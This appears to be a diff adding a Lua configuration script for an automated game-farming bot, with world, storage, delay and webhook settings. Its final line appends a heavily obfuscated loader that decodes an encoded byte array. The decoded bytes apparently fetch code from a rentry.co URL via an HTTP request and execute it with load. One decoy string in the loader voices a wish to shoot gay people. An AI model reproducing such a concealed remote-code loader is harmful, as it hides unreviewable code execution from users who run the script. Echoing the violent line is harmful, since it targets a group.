@@ -1,0 +1,65 @@
+-- CUSTOM MODE PNB
+PNBWithGaut = false                -- fale if you want pnb no gaut
+
+-- LOCK ONWER SETTING
+WorldDetecting = "x"               -- meet bot here
+
+-- BOT SETTING
+BotAccount = true                  -- false if want use guest account  
+
+-- WORLD PNB
+World_PNB = "x"                    -- world name 
+World_PNB_ID = "x"                 -- id door  
+kordinatX = 28                     -- position pnb x in rgt
+kordinatY = 24                     -- position pnb y in rgt 
+
+-- CUSTOM AUTO USE PICKAXE
+AutoTakePickaxe = false            -- custom take pickaxe
+Pickaxe_Storage = "x"              -- world name
+Pickaxe_Storage_ID = "x"           -- id door               
+
+-- TREE ID
+Block_ID = 4584                    -- block id
+Seed_ID = 4585                     -- seed id
+
+-- BLOCK STORAGE
+Block_Storage = "x"                -- take block here
+Block_Storage_ID = "x"             -- id door
+
+-- SEED STORAGE
+SeedAmountToSave = 190             -- bot will save seed when have 190 at bp
+Seed_Storage = "x"                 -- save seed here
+Seed_Storage_ID = "x"              -- id door
+BGFGPOS_Drop_Seed = 4584           -- position drop
+
+-- PACK STORAGE
+Pack_Storage = "x"                 -- save pack here
+Pack_Storage_ID = "x"              -- id door
+BGFGPOS_Drop_Pack = 16             -- position drop
+
+-- DELAY SETTING
+delayjoinWorld = 5000              -- delay join world
+delayjoinIDDoor = 4000             -- delay join id door
+delayPlace = 150                   -- delay place
+delayBreak = 200                   -- delay break
+
+-- GEMS SETTINGS 
+Pack_Name = "world_lock"           -- debug pack name
+Pack_Price = 2000                  -- pack price per buy
+Pack_Item_ID = {242}               -- pack item id
+Total_Pack_Item = 1                -- all total item id
+Pack_Counting = 242                -- id item for scan in pack storage (only need 1 id)
+minimal_gems = 2000                -- minimal gems to buy pack
+
+-- CUSTOM TILE PNB
+Tile_PNB = 5                       -- only can 5 tile
+
+--> TRASH SETTING
+TrashList = {5024,5026,5028, 5032, 5034, 5036, 5038, 5040, 5042, 5044, 7162, 7164} -- id trash item
+
+-- WEBHOOK SETTING
+editWebhook = false                 -- false if you want to use spam webhook
+webhookURL = "x"                    -- url webhook
+messageId = 112989397561300177      -- message id webhook  
+
+key=[[JANGAN DI DESCRYPT]];svydmauhoxvmzooctwkyoneoygbcmwaqfyhvpvhqinfhntmzvcsteskmhriudkbdjgkvilvhxalydqyklfpwvgyegznrzfjajvjmdrntouxfhbtwytxlbeohkfensfbd='om jangan decrypt aku :((';pyeponkywdmptfjetadruvuaoqfasloanysdjaocsrujuzlihhesvqshefilnnreumfolbntoscdbdjggjsvoulogdcvkqscmlydozgqqupilcbbrqyciqoerpdtlggs='Obfuscator Ini Milik ZiGb';gumugivmtlvipluqkagavrhkuyqvqzfctdcwvfmipjhkhlufqbuooliwemxloahjpvvjkoqcvjrwdpekrajbsvzqqftssndzkheacysypgvubdbijjzmpqotitkanplq='Kamu Nyari Load?';kolenzlbljcysydzblfgmqwcxwfbzwxxgmafbvffoavckifpfcgnfwmscendgdwqxjveqvdsxwgyhsbzipgboqusmqizzgzsnlxwxrhxzkgyhlcpqheiobyuoysiwstz='Saya Tak Ragu Ingin Nembak Gay People';kubsxpygkvgapsaxnndpfaxfrcxyhvemopmrpccthkuqvpcwhpnkajomtsfyklorxvfppiokvkixcsaytyjygolcikpfglfccxaekyogioggbmyhpeqhzdxazhvtwwfx="Soeharto is first indonesian president. Jokowi is seventh indonesian's president, Itadori Yuuji is one of main character in Jujutsu Kaisen Anime, Kento Nanami is Side Character On Jujutsu Kaisen Anime. Lava is 1 of the most dangerous liquid in the world (cap)";fpnuujjarqrmehovguarltbvcwlzughyeriixnlxpmakwrkbkcyusmzrczeuaqwnmrysbzgitijfpieuylajsxycwgehbrxwuxdcnwzropgoemvatlythedsnqrkcess={ 1,288,3,315,364,405,385,372,288,313,435,301,298,314,298,292,296,296,408,374,288,288,288,288,288,288,288,288,288,288,288,328,407,352,289,488,352,355,346,380,373,403,389,402,403,380,353,388,397,393,398,393,403,404,402,385,404,399,402,380,356,389,403,395,404,399,400,380,386,399,404,380,399,386,390,405,403,387,385,404,389,388,380,400,398,386,383,396,405,387,393,390,389,402,383,389,398,387,383,406,337,334,336,334,396,405,385,421,431,288,288,292,439,299,288,288,289,302,288,288,290,356,288,289,290,303,288,288,288,299,288,288,288,308,416,288,291,299,289,288,292,302,289,290,293,356,288,291,289,299,288,288,288,306,416,294,295,299,288,288,288,302,288,288,296,306,416,297,298,299,288,288,288,308,416,288,299,356,288,290,290,430,288,288,300,299,289,288,301,416,289,289,288,356,289,290,290,356,289,289,289,359,289,289,288,430,292,427,392,404,404,400,355,396,393,389,398,404,292,427,360,404,404,400,355,396,393,389,398,404,292,420,398,389,407,292,426,403,389,404,365,389,404,392,399,388,292,423,365,389,404,392,399,388,292,420,391,389,404,292,420,405,402,396,292,445,392,404,404,400,403,346,335,335,402,389,398,404,402,409,334,387,399,335,338,391,403,340,408,402,335,402,385,407,292,424,392,389,385,388,389,402,403,292,427,373,403,389,402,333,353,391,389,398,404,292,424,364,405,387,393,390,389,402,292,424,402,389,401,405,389,403,404,292,421,386,399,388,409,292,421,396,399,385,388,417,288,288,288,416,439,290,288,288,288,289,288,288,288,288,289,288,289,288,288,289,288,288,289,290,288,288,288,289,416,418,427,392,404,404,400,370,389,403,405,396,404,433,439,425,402,389,403,400,399,398,403,389,434,439,417,421,383,357,366,374};local nau = 'load'; function wpjnztsvnltvsigcpcitcqxycvceolooatpqibcanfqwlqfrddjxpeqxelxmwhumjzigpunlwpwhqxecyazkjvytosaokbknphwsvvoguojlnujieuirljyvlasdwbjz(...) local kudkwrgbwcfefxsddprcjwomwckdsuipduiuiaugektkxcttsjxokeqdkfuvyyarpnyfgjnyqkjkpzutdvhwgsvizclzhncxyjhhbecoyvarkuneiyvvkuufkjlwhvdt='';for yazqxvplazbspoefcqzyoejhmswdjalhpvfzaqsaoujgfmrgtjhnilfqyqpzrpadckyhxdbxejcakzimmqzepvwokxghfefycglanaqhlwbubpcnjgazzvemxjgjjaxz=1, #fpnuujjarqrmehovguarltbvcwlzughyeriixnlxpmakwrkbkcyusmzrczeuaqwnmrysbzgitijfpieuylajsxycwgehbrxwuxdcnwzropgoemvatlythedsnqrkcess do if yazqxvplazbspoefcqzyoejhmswdjalhpvfzaqsaoujgfmrgtjhnilfqyqpzrpadckyhxdbxejcakzimmqzepvwokxghfefycglanaqhlwbubpcnjgazzvemxjgjjaxz>3 then kudkwrgbwcfefxsddprcjwomwckdsuipduiuiaugektkxcttsjxokeqdkfuvyyarpnyfgjnyqkjkpzutdvhwgsvizclzhncxyjhhbecoyvarkuneiyvvkuufkjlwhvdt=kudkwrgbwcfefxsddprcjwomwckdsuipduiuiaugektkxcttsjxokeqdkfuvyyarpnyfgjnyqkjkpzutdvhwgsvizclzhncxyjhhbecoyvarkuneiyvvkuufkjlwhvdt.._ENV['\115\116\114\105\110\103']['\99\104\97\114']((fpnuujjarqrmehovguarltbvcwlzughyeriixnlxpmakwrkbkcyusmzrczeuaqwnmrysbzgitijfpieuylajsxycwgehbrxwuxdcnwzropgoemvatlythedsnqrkcess[yazqxvplazbspoefcqzyoejhmswdjalhpvfzaqsaoujgfmrgtjhnilfqyqpzrpadckyhxdbxejcakzimmqzepvwokxghfefycglanaqhlwbubpcnjgazzvemxjgjjaxz]-fpnuujjarqrmehovguarltbvcwlzughyeriixnlxpmakwrkbkcyusmzrczeuaqwnmrysbzgitijfpieuylajsxycwgehbrxwuxdcnwzropgoemvatlythedsnqrkcess[2]));end end;local tolan = 'loadstring';_ENV[_ENV['\115\116\114\105\110\103']['\99\104\97\114'](pyeponkywdmptfjetadruvuaoqfasloanysdjaocsrujuzlihhesvqshefilnnreumfolbntoscdbdjggjsvoulogdcvkqscmlydozgqqupilcbbrqyciqoerpdtlggs:lower():sub(18,18):byte(),svydmauhoxvmzooctwkyoneoygbcmwaqfyhvpvhqinfhntmzvcsteskmhriudkbdjgkvilvhxalydqyklfpwvgyegznrzfjajvjmdrntouxfhbtwytxlbeohkfensfbd:lower():sub(1,1):byte(),kolenzlbljcysydzblfgmqwcxwfbzwxxgmafbvffoavckifpfcgnfwmscendgdwqxjveqvdsxwgyhsbzipgboqusmqizzgzsnlxwxrhxzkgyhlcpqheiobyuoysiwstz:lower():sub(-9,-9):byte(),kubsxpygkvgapsaxnndpfaxfrcxyhvemopmrpccthkuqvpcwhpnkajomtsfyklorxvfppiokvkixcsaytyjygolcikpfglfccxaekyogioggbmyhpeqhzdxazhvtwwfx:lower():sub(21,21):byte())](kudkwrgbwcfefxsddprcjwomwckdsuipduiuiaugektkxcttsjxokeqdkfuvyyarpnyfgjnyqkjkpzutdvhwgsvizclzhncxyjhhbecoyvarkuneiyvvkuufkjlwhvdt)(); end;wpjnztsvnltvsigcpcitcqxycvceolooatpqibcanfqwlqfrddjxpeqxelxmwhumjzigpunlwpwhqxecyazkjvytosaokbknphwsvvoguojlnujieuirljyvlasdwbjz(fpnuujjarqrmehovguarltbvcwlzughyeriixnlxpmakwrkbkcyusmzrczeuaqwnmrysbzgitijfpieuylajsxycwgehbrxwuxdcnwzropgoemvatlythedsnqrkcess);
